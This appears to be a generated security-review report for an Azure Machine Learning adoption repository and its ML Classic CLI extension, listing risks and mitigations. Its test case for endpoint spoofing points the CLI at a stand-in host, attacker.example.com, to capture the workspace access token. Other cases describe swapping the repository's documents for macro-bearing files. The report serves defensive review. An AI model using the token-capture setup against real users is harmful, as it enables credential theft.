## Combined Vulnerability List

Below is a combined list of identified vulnerabilities, with duplicates removed, formatted in markdown.

### 1. Malicious File Distribution through Document Replacement

- **Description:**
    1. An attacker gains unauthorized write access to the GitHub repository.
    2. The attacker replaces legitimate documentation files (e.g., .docx, .pptx, .xlsx, .pdf, .png) within the repository with malicious files containing embedded malware.
    3. Unsuspecting users seeking guidance on Azure Machine Learning adoption are directed to this repository.
    4. Users, trusting the repository as a source of official Microsoft documentation, download the seemingly legitimate files.
    5. Upon opening the downloaded malicious files, the embedded malware is executed on the user's system, potentially triggered by macros, crafted images, or software vulnerabilities.

- **Impact:**
    - Compromise of user systems with malware (viruses, trojans, ransomware, spyware).
    - Data theft, unauthorized access to sensitive information, system instability, and operational disruption.
    - Reputational damage to Microsoft and erosion of trust in Azure Machine Learning resources.
    - Supply chain attack vector to distribute malware to users relying on Microsoft's guidance.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    - None explicitly mentioned beyond standard GitHub security features like access control and the general security posture of the platform.
    - `SECURITY.md` exists for reporting vulnerabilities but does not prevent this specific issue.

- **Missing Mitigations:**
    - **Content Integrity Verification:**
        - Digitally sign document files to guarantee origin and integrity.
        - Provide checksums (SHA256 hashes) for downloadable files in `README.md` or a dedicated page.
    - **Repository Write Access Control & Monitoring:**
        - Enforce strict access control policies based on least privilege.
        - Implement monitoring and auditing of repository changes to detect unauthorized modifications.
        - Enable branch protection rules requiring reviews for critical branches.
    - **Regular Security Scanning:**
        - Implement automated security scanning of repository content for malware.
        - Regularly review the repository for unexpected or unauthorized files.
    - **User Awareness and Security Guidance:**
        - Add a security warning in `README.md` about downloading files from public repositories and recommend antivirus scanning.
        - Recommend best practices for verifying file integrity using checksums or digital signatures.

- **Preconditions:**
    - Attacker gains write access to the GitHub repository.
    - Users are attracted to the repository and download documentation files.

- **Source Code Analysis:**
    - Vulnerability is in the project's nature as a content repository, not directly in source code.
    - `README.md` prominently links to documentation files in subdirectories like `aml-adoption-framework/` and `web-service-migration-example/`.
    - No automated integrity checks or validation of documentation files are present in the code.
    - `SECURITY.md` is for reporting vulnerabilities, not mitigation.

- **Security Test Case:**
    1. **Setup:** Clone the GitHub repository.
    2. **Malicious File Replacement:** Replace `aml-adoption-framework/aml-adoption-framework.docx` with a malicious `.docx` file containing a macro virus.
    3. **Commit and Push (Simulated):** Simulate attacker committing and pushing changes.
    4. **Download as User:** Download the replaced `aml-adoption-framework.docx` file from the repository.
    5. **Open and Execute (Simulated):** Open the downloaded file in a test system (VM or sandbox) and enable macros if prompted.
    6. **Verification:** Observe execution of malicious payload (antivirus alert, unexpected system behavior). Confirm malicious code execution and document observations as proof of concept.

### 2. Man-in-the-Middle Vulnerability via Workspace API Endpoint Spoofing

- **Description:**
    1. The Azure CLI extension allows users to specify the workspace API endpoint using `--workspace-api-endpoint` or `-wapi`.
    2. An attacker could trick a user into using a malicious API endpoint URL.
    3. If a malicious endpoint is used, all API requests, including the user's workspace access token and workspace data, are sent to the attacker-controlled endpoint.
    4. The attacker intercepts and logs these requests, potentially gaining unauthorized access to the user's Azure ML Classic workspace access token and sensitive information.

- **Impact:**
    - **High**: Stealing Azure ML Classic workspace access tokens and sensitive information about ML Classic assets.
    - Unauthorized access to the user's Azure ML Classic environment.
    - Potential data breaches and unauthorized modification or deletion of ML assets.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    - None: The tool accepts the workspace API endpoint as a user-provided parameter without validation or security warnings.

- **Missing Mitigations:**
    - **Input Validation and Warning**:
        - Validate the format of the provided workspace API endpoint.
        - Display a security warning when a custom endpoint is used, advising caution and trusted endpoints only.
    - **Documentation Enhancement**:
        - Explicitly mention security risks of using custom API endpoints.
        - Advise against using untrusted or unknown endpoints.

- **Preconditions:**
    - Attacker tricks the user into running the Azure CLI extension with a malicious `--workspace-api-endpoint` parameter (social engineering, phishing).
    - User has an Azure account with ML Classic workspace access and uses the CLI extension.

- **Source Code Analysis:**
    1. **`/code/automated_assessment/azext_mlclassicextension/api_client.py`**: `APIClient` constructor takes `api_endpoint` and uses it to construct API URLs in `__send_get_req` and `__send_management_get_req`.
    2. **`/code/automated_assessment/azext_mlclassicextension/workspace.py`**: `MLClassicWorkspace` constructor passes `api_endpoint` to `APIClient`.
    3. **`/code/automated_assessment/azext_mlclassicextension/__init__.py`**: CLI command functions like `show_workspace` take `workspace_api_endpoint` and pass it to `MLClassicWorkspace`.
    4. **`/code/automated_assessment/azext_mlclassicextension/__init__.py` & `/code/automated_assessment/azext_mlclassicextension/commands.py`**: `MLClassicCommandsLoader.load_arguments` defines `workspace_api_endpoint` as a CLI argument.

    ```
    User (CLI) -->  az mlclassic workspace show --wapi <malicious_endpoint> ...
                      |
                      V
    CLI Extension (__init__.py) --> show_workspace(workspace_api_endpoint=<malicious_endpoint>, ...)
                                        |
                                        V
    MLClassicWorkspace (workspace.py) --> APIClient(api_endpoint=<malicious_endpoint>, ...)
                                              |
                                              V
    APIClient (api_client.py) --------> requests.get(url=urljoin(<malicious_endpoint>, api_path), ...)
                                                      |
                                                      V
    Attacker Server (malicious_endpoint) <-- Receives API request with Access Token and Workspace Data
    ```

- **Security Test Case:**
    1. **Setup Attacker Server:** Create an HTTP server (e.g., Python `http.server`) logging all requests on a public IP (e.g., `http://attacker.example.com:8080`).
    2. **Malicious API Endpoint URL:** Construct a malicious URL: `http://attacker.example.com:8080/api/`.
    3. **Run CLI with Malicious Endpoint:** Execute Azure CLI command with `--workspace-api-endpoint http://attacker.example.com:8080/api/` and valid workspace details.
    4. **Inspect Attacker Server Logs:** Check server logs for received HTTP requests, including headers and paths.
    5. **Verify Data Interception:** Analyze intercepted requests for access token (`x-ms-metaanalytics-authorizationtoken`) and workspace details.

### 3. Malicious Excel Template Distribution

- **Description:**
    - An attacker replaces the legitimate `self-assessment-survey.xlsx` file in the repository with a malicious Excel file.
    - This malicious file contains macros or other embedded threats.
    - A user downloads and opens this compromised Excel file, trusting the repository.
    - Malicious content within the Excel file executes upon opening.

- **Impact:**
    - Malware infection on the user's machine.
    - Unauthorized access to the user's system and data.
    - Data theft, system compromise, and malware propagation within the user's network.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    - None. No specific mitigations to prevent malicious Excel file distribution. `SECURITY.md` provides general security reporting guidelines only.

- **Missing Mitigations:**
    - **Integrity Check:**
        - Provide a checksum (SHA256 hash) of the legitimate `self-assessment-survey.xlsx` in `README.md` or a security file for manual verification. Digital signatures would be more robust.
    - **Security Warning:**
        - Add a prominent security warning in `README.md` near the `self-assessment-survey.xlsx` link.
        - Advise users about risks of downloading executable files (including Excel with macros) from any source and recommend antivirus scanning before opening.

- **Preconditions:**

    - Attacker replaces `self-assessment-survey.xlsx` with a malicious version.
    - User trusts the repository and downloads `self-assessment-survey.xlsx`.
    - User opens the downloaded Excel file, potentially without security precautions.

- **Source Code Analysis:**
    - Vulnerability is in `README.md` linking to `self-assessment-survey.xlsx`, not in other source code.
    - File: `/code/README.md` links to `self-assessment-survey.xlsx`.
    ```markdown
    The Self-Assessment Survey template is available [here](./self-assessment-survey.xlsx).
    ```
    - No code-based checks validate the integrity or safety of the linked Excel file.

- **Security Test Case:**
    1. **Setup:** Attacker gains write access to the repository (for testing).
    2. **Action:**
        - Create a malicious `self-assessment-survey.xlsx` with a benign macro (e.g., popup "Malicious Macro Executed").
        - Replace the original `self-assessment-survey.xlsx` in the repository with the malicious file.
    3. **Verification:**
        - Test user navigates to `README.md` and downloads `self-assessment-survey.xlsx`.
        - Test user opens the downloaded file and enables macros if prompted.
        - Observe macro execution (e.g., popup "Malicious Macro Executed").
    4. **Expected Result:** Macro executes, demonstrating malicious file distribution and potential user compromise.
